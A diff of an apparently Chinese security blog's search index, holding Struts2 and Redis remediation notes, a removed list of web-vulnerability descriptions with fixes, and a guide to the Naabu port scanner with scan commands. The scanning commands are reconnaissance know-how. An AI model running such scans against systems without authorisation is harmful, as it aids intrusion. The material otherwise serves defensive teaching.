+<h2 id="Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-045）"></a>Apache Struts2 远程代码执行漏洞（S2-045）</h2><h3 id="S2-045漏洞描述"><a href="#S2-045漏洞描述" class="headerlink" title="S2-045漏洞描述"></a>S2-045漏洞描述</h3><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
+<h3 id="S2-045漏洞修复建议"><a href="#S2-045漏洞修复建议" class="headerlink" title="S2-045漏洞修复建议"></a>S2-045漏洞修复建议</h3><p>　　检测方式查看web目录下&#x2F;WEB-INF&#x2F;lib&#x2F;目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
+<p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p>
+<p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
+<p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
+<p>　　4、修改WEB-INF&#x2F;classes目录下的配置</p>
+<p>　　在WEB-INF&#x2F;classes目录下的struts.xml中的struts 标签下添加</p>
+<p>　　&lt;constantname&#x3D;”struts.custom.i18n.resources”value&#x3D;”global”&#x2F;&gt;；</p>
+<p>　　在WEB-INF&#x2F;classes&#x2F;目录下添加global.properties，文件内容如下:struts.messages.upload.error.InvalidContentTypeException&#x3D;1</p>
+<h2 id="Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-033）"></a>Apache Struts2 远程代码执行漏洞（S2-033）</h2><h3 id="S2-033漏洞描述"><a href="#S2-033漏洞描述" class="headerlink" title="S2-033漏洞描述"></a>S2-033漏洞描述</h3><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
+<h3 id="S2-033漏洞修复建议"><a href="#S2-033漏洞修复建议" class="headerlink" title="S2-033漏洞修复建议"></a>S2-033漏洞修复建议</h3><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p>
+<p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>
+<h2 id="redis相关漏洞修复"><a href="#redis相关漏洞修复" class="headerlink" title="redis相关漏洞修复"></a>redis相关漏洞修复</h2><h3 id="redis相关漏洞描述"><a href="#redis相关漏洞描述" class="headerlink" title="redis相关漏洞描述"></a>redis相关漏洞描述</h3><p>　　redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p>
+<h3 id="redis相关漏洞修复建议"><a href="#redis相关漏洞修复建议" class="headerlink" title="redis相关漏洞修复建议"></a>redis相关漏洞修复建议</h3><p>　　1.禁用一些高危命令</p>
+<p>　　　　常见如：flushdb，flushall，config，keys 等</p>
+<p>　　2.以低权限运行 Redis 服务</p>
+<p>　　3.为 Redis 添加密码验证</p>
+<p>　　4.禁止外网访问 Redis</p>
+<p>　　5.保证 authorized_keys 文件的安全</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞修复</tag>
       </tags>
   </entry>
   <entry>
@@ -462,6 +880,65 @@
       </tags>
   </entry>
   <entry>
+    <title>Naabu</title>
+    <url>/2024/01/15/Naabu-tool/</url>
+    <content><![CDATA[<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>Naabu是一款基于Go语言开发的快速端口扫描工具，该工具可以帮助广大研究人员以快速可靠的方式枚举目标主机的有效端口。该工具在实现了简单易用的情况下，同时保证了运行的可靠性。该工具支持对主机&#x2F;主机列表进行快速SYN&#x2F;CONNECT扫描，并列出所有返回了响应信息的端口。</p>
+<h3 id="Naabu-功能介绍"><a href="#Naabu-功能介绍" class="headerlink" title="Naabu 功能介绍"></a>Naabu 功能介绍</h3><p>快速简单的SYN&#x2F;CONNECT探针扫描</p>
+<p>使用Shodan Internetdb API的被动端口枚举功能</p>
+<p>优化了易用性和资源的轻量级</p>
+<p>端口扫描引入自动IP重复数据消除</p>
+<p>基于NMAP的服务发现功能</p>
+<p>多来源输入支持：STDIN&#x2F;HOST&#x2F;IP&#x2F;CIDR</p>
+<p>多格式输出支持：JSON&#x2F;TXT&#x2F;STDOUT</p>
+<h3 id="Naabu-具体使用方法"><a href="#Naabu-具体使用方法" class="headerlink" title="Naabu 具体使用方法"></a>Naabu 具体使用方法</h3><p>使用方法。<br>  .&#x2F;naabu [flags]</p>
+<p>INPUT:<br>   -host string                要扫描端口的主机<br>   -list, -l string            包含要扫描端口的主机列表的文件<br>   -exclude-hosts, -eh string  指定一个用逗号分隔的列表，列出要从扫描中排除的目标（ip, cidr）。<br>   -exclude-file, -ef string   指定一个以新行分隔的文件，包含要从扫描中排除的目标（ip, cidr）。</p>
+<p>PORT:<br>   -port, -p string            要扫描的端口（80, 80,443, 100-200<br>   -top-ports, -tp string      要扫描的顶级端口 (默认为前100)<br>   -exclud-ports, -ep string   要从扫描中排除的端口<br>   -ports-file, -pf string     包含要扫描的端口的文件<br>   -exclude-cdn, -ec           跳过对CDN的完整端口扫描（只检查80,443）。</p>
+<p>RATE-LIMIT:<br>   -c int                      一般内部工作线程(默认为25)<br>   -rate int                   端口扫描探测请求的速率（默认为1000）。</p>
+<p>OUTPUT:<br>   -o, -output string          将输出写入的文件(可选)<br>   -json                       以JSON行格式写输出</p>
+<p>CONFIGURATION:<br>   -scan-all-ips               扫描所有的ips<br>   -scan-type, -s string       端口扫描类型(SYN&#x2F;CONNECT) (默认为s)<br>   -source-ip string           来源Ip<br>   -interface-list, -il        列出可用的接口和公共IP<br>   -interface, -i string       用于端口扫描的网络接口<br>   -nmap                       在目标上调用nmap扫描(必须安装nmap)<br>   -nmap-cli string            在找到的结果上运行nmap命令（例如：-nmap-cli ‘nmap -sV’）。</p>
+<p>优化。<br>   -retries int                端口扫描探测的重试次数(默认为3)<br>   -timeout int                超时前等待的毫秒数(默认为1000)<br>   -warm-up-time int           扫描阶段之间的时间（秒）（默认为2<br>   -ping                       使用ping探针来验证主机<br>   -verify                     用TCP验证再次验证端口</p>
+<p>DEBUG:<br>   -debug                      启用调试信息<br>   -v                          显示Verbose输出<br>   -no-color, -nc              在输出中不使用颜色<br>   -silent                     在输出中只显示找到的端口<br>   -version                    显示naabu的版本<br>   -stats                      显示运行中的扫描的统计信息</p>
+<h3 id="Naabu-常见使用方法"><a href="#Naabu-常见使用方法" class="headerlink" title="Naabu 常见使用方法"></a>Naabu 常见使用方法</h3><p>常见使用方式为</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+<p>上述命令将会争对[目标web地址]执行扫描，此时还可以结合其他参数选项一起允许，比如“-v” 可以开启Verbose模式等</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Naabu/Naabu-0.jpg"
+                      alt="Naabu 图片"
+                ></p>
+<p>或者，使用 “-p”参数指定需要扫描的端口号：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -p 80,443,21-23 -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+<p>默认配置下，Naabu将会检查Nmap钟的前100个端口。</p>
+<p>扫描Nmap前100个端口：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -top-ports 100 -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+
+<p>扫描Nmap前1000个端口：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -top-torts 1000 -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+
+<p>扫描从1-65535的完整端口</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -p - -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+
+<p>还可以指定需要排除的端口：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -p - -exclude-ports 80,443 -host [目标Web地址]</span><br></pre></td></tr></table></figure></div>
+
+<p>如果需要扫描主机列表，可以使用本地目录下的“-list”选项：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -p - -list hosts.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>可以使用JSON格式进行输出</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ naabu -host xx.xx.xx.xx -json</span><br></pre></td></tr></table></figure></div>
+<p>最后得到显示为：<br>{“ip”:”xx.xx.xx.xx”:”port”:443}<br>{“ip”:”xx.xx.xx.xx”:”port”:80}</p>
+<h3 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址-1"></a>下载地址-1</h3><p><a class="link"   href="https://github.com/projectdiscovery/naabu" >https://github.com/projectdiscovery/naabu <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="个人推荐指数"><a href="#个人推荐指数" class="headerlink" title="个人推荐指数"></a>个人推荐指数</h3><p>推荐：⭐⭐⭐  比较推荐</p>
+]]></content>
+      <categories>
+        <category>漏扫工具使用</category>
+      </categories>
+      <tags>
+        <tag>漏扫工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信息搜集工具</title>
     <url>/2023/09/26/Search-tool/</url>
     <content><![CDATA[<h1 id="支持的平台"><a href="#支持的平台" class="headerlink" title="支持的平台"></a>支持的平台</h1><p>基于python pyside2库实现的，支持windows macos，windows至少需要win7以上系统才能运行，支持一键导出</p>
@@ -545,499 +1022,90 @@
       </tags>
   </entry>
   <entry>
-    <title>Web常见漏洞描述及修复建议</title>
-    <url>/2024/01/04/LD-BugFixes/</url>
-    <content><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入漏洞描述"><a href="#SQL注入漏洞描述" class="headerlink" title="SQL注入漏洞描述"></a>SQL注入漏洞描述</h3><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
-<h3 id="SQL注入修复建议"><a href="#SQL注入修复建议" class="headerlink" title="SQL注入修复建议"></a>SQL注入修复建议</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
-<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
-<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
-<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
-<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
-<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
-<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
-<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
-<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS漏洞描述"><a href="#XSS漏洞描述" class="headerlink" title="XSS漏洞描述"></a>XSS漏洞描述</h3><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML&#x2F;JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。<br>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
-<h3 id="XSS攻击可导致以下危害："><a href="#XSS攻击可导致以下危害：" class="headerlink" title="XSS攻击可导致以下危害："></a>XSS攻击可导致以下危害：</h3><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
-<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
-<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
-<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
-<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
-<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
-<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
-<h3 id="XSS修复建议"><a href="#XSS修复建议" class="headerlink" title="XSS修复建议"></a>XSS修复建议</h3><p>　　xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
-<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
-<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
-<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
-<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
-<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE漏洞描述"><a href="#XXE漏洞描述" class="headerlink" title="XXE漏洞描述"></a>XXE漏洞描述</h3><p>参考：<a class="link"   href="https://www.freebuf.com/company-information/165769.html" >https://www.freebuf.com/company-information/165769.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF漏洞描述"><a href="#CSRF漏洞描述" class="headerlink" title="CSRF漏洞描述"></a>CSRF漏洞描述</h3><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
-<h3 id="CSRF漏洞修复建议"><a href="#CSRF漏洞修复建议" class="headerlink" title="CSRF漏洞修复建议"></a>CSRF漏洞修复建议</h3><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p>
-<p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="SSRF漏洞描述"><a href="#SSRF漏洞描述" class="headerlink" title="SSRF漏洞描述"></a>SSRF漏洞描述</h3><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
-<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
-<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
-<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
-<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
-<p>　　(5)、利用File协议读取本地文件。</p>
-<h3 id="SSRF漏洞修复建议"><a href="#SSRF漏洞修复建议" class="headerlink" title="SSRF漏洞修复建议"></a>SSRF漏洞修复建议</h3><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</p>
-<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
-<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
-<p>　　4、验证请求的文件格式</p>
-<p>　　5、禁止跳转</p>
-<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
-<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
-<h2 id="任意命令-代码执行"><a href="#任意命令-代码执行" class="headerlink" title="任意命令&#x2F;代码执行"></a>任意命令&#x2F;代码执行</h2><h3 id="任意命令-代码执行漏洞描述"><a href="#任意命令-代码执行漏洞描述" class="headerlink" title="任意命令&#x2F;代码执行漏洞描述"></a>任意命令&#x2F;代码执行漏洞描述</h3><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
-<h3 id="任意命令-代码执行漏洞修复建议"><a href="#任意命令-代码执行漏洞修复建议" class="headerlink" title="任意命令&#x2F;代码执行漏洞修复建议"></a>任意命令&#x2F;代码执行漏洞修复建议</h3><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
-<p>　　2、减少或不使用代码或命令执行函数</p>
-<p>　　3、客户端提交的变量在放入函数前进行检测</p>
-<p>　　4、减少或不使用危险函数</p>
-<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="任意文件上传漏洞描述"><a href="#任意文件上传漏洞描述" class="headerlink" title="任意文件上传漏洞描述"></a>任意文件上传漏洞描述</h3><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
-<h3 id="任意文件上传修复建议"><a href="#任意文件上传修复建议" class="headerlink" title="任意文件上传修复建议"></a>任意文件上传修复建议</h3><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
-<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
-<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
-<p>　　4、严格限制上传的文件路径。</p>
-<p>　　5、文件扩展名服务端白名单校验。</p>
-<p>　　6、文件内容服务端校验。</p>
-<p>　　7、上传文件重命名。</p>
-<p>　　8、隐藏上传文件路径。</p>
-<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="目录遍历漏洞描述"><a href="#目录遍历漏洞描述" class="headerlink" title="目录遍历漏洞描述"></a>目录遍历漏洞描述</h3><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符..&#x2F;跳出程序本身的限制目录，来下载或显示任意文件。</p>
-<h3 id="目录遍历漏洞修复建议"><a href="#目录遍历漏洞修复建议" class="headerlink" title="目录遍历漏洞修复建议"></a>目录遍历漏洞修复建议</h3><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符..&#x2F;。</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含漏洞描述"><a href="#文件包含漏洞描述" class="headerlink" title="文件包含漏洞描述"></a>文件包含漏洞描述</h3><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
-<h3 id="文件包含漏洞修复建议"><a href="#文件包含漏洞修复建议" class="headerlink" title="文件包含漏洞修复建议"></a>文件包含漏洞修复建议</h3><p>　　1、严格检查变量是否已经初始化。</p>
-<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现.&#x2F;和..&#x2F;等目录跳转符。</p>
-<p>　　3、严格检查文件包含函数中的参数是否外界可控。</p>
-<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="弱口令漏洞描述"><a href="#弱口令漏洞描述" class="headerlink" title="弱口令漏洞描述"></a>弱口令漏洞描述</h3><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
-<p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
-<h3 id="弱口令漏洞修复建议"><a href="#弱口令漏洞修复建议" class="headerlink" title="弱口令漏洞修复建议"></a>弱口令漏洞修复建议</h3><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
-<p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
-<p>　　3、增加人机验证机制，限制ip访问次数。</p>
-<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="暴力破解漏洞描述"><a href="#暴力破解漏洞描述" class="headerlink" title="暴力破解漏洞描述"></a>暴力破解漏洞描述</h3><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
-<h3 id="暴力破解漏洞修复建议"><a href="#暴力破解漏洞修复建议" class="headerlink" title="暴力破解漏洞修复建议"></a>暴力破解漏洞修复建议</h3><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
-<p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
-<p>　　3、增加人机验证机制</p>
-<p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
-<h2 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h2><h3 id="越权访问漏洞描述"><a href="#越权访问漏洞描述" class="headerlink" title="越权访问漏洞描述"></a>越权访问漏洞描述</h3><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
-<h3 id="越权访问漏洞修复建议"><a href="#越权访问漏洞修复建议" class="headerlink" title="越权访问漏洞修复建议"></a>越权访问漏洞修复建议</h3><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p>
-<p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p>
-<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="未授权访问漏洞描述"><a href="#未授权访问漏洞描述" class="headerlink" title="未授权访问漏洞描述"></a>未授权访问漏洞描述</h3><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
-<h3 id="未授权访问漏洞修复建议"><a href="#未授权访问漏洞修复建议" class="headerlink" title="未授权访问漏洞修复建议"></a>未授权访问漏洞修复建议</h3><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
-<p>　　2、可以使用session对用户的身份进行判断和控制。</p>
-<h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><h3 id="列目录漏洞描述"><a href="#列目录漏洞描述" class="headerlink" title="列目录漏洞描述"></a>列目录漏洞描述</h3><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
-<h3 id="列目录漏洞修复建议"><a href="#列目录漏洞修复建议" class="headerlink" title="列目录漏洞修复建议"></a>列目录漏洞修复建议</h3><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
-<p>　　2、设置目录访问权限</p>
-<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="PHP反序列化漏洞描述"><a href="#PHP反序列化漏洞描述" class="headerlink" title="PHP反序列化漏洞描述"></a>PHP反序列化漏洞描述</h3><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
-<p>　　可参考：<a class="link"   href="https://www.freebuf.com/articles/web/167721.html" >https://www.freebuf.com/articles/web/167721.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="PHP反序列化漏洞修复建议"><a href="#PHP反序列化漏洞修复建议" class="headerlink" title="PHP反序列化漏洞修复建议"></a>PHP反序列化漏洞修复建议</h3><p>　　1、对传入的对象进行严格的过滤检查</p>
-<p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
-<h2 id="http-slow拒绝服务攻击"><a href="#http-slow拒绝服务攻击" class="headerlink" title="http slow拒绝服务攻击"></a>http slow拒绝服务攻击</h2><h3 id="拒绝服务攻击漏洞描述"><a href="#拒绝服务攻击漏洞描述" class="headerlink" title="拒绝服务攻击漏洞描述"></a>拒绝服务攻击漏洞描述</h3><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
-<h3 id="拒绝服务攻击漏洞修复建议"><a href="#拒绝服务攻击漏洞修复建议" class="headerlink" title="拒绝服务攻击漏洞修复建议"></a>拒绝服务攻击漏洞修复建议</h3><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
-<p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
-<p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
-<p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p>
-<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><h3 id="CRLF注入漏洞描述"><a href="#CRLF注入漏洞描述" class="headerlink" title="CRLF注入漏洞描述"></a>CRLF注入漏洞描述</h3><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
-<h3 id="CRLF注入漏洞修复建议"><a href="#CRLF注入漏洞修复建议" class="headerlink" title="CRLF注入漏洞修复建议"></a>CRLF注入漏洞修复建议</h3><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p>
